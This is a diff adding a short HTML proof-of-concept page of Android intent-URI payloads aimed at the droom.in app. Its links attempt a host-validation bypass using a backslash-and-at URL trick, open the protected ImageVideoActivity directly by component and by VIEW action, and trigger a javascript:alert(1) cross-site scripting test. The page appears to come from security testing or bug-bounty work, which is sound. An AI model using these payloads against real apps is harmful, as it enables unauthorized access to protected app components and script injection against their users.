@@ -1,0 +1,14 @@
+
+<html>
+<head>
+<title>Testing</title>
+</head>
+<body>
+<h1>
+<a href="intent://test/#Intent;scheme=drm://google.com\\@droom.in/;end">Host_Validation_Bypass</a><br>
+<a href="intent://test#Intent;component=in.droom/in.droom.activity.ImageVideoActivity;end">Access_protected_activity_by_component</a><br>
+<a href="intent://test/#Intent;action=android.intent.action.VIEW;end">Access_protected_activity_by_action</a><br>
+  <a href="javascript:alert(1)">XSS</a>
+</h1>  
+</body>
+</html>
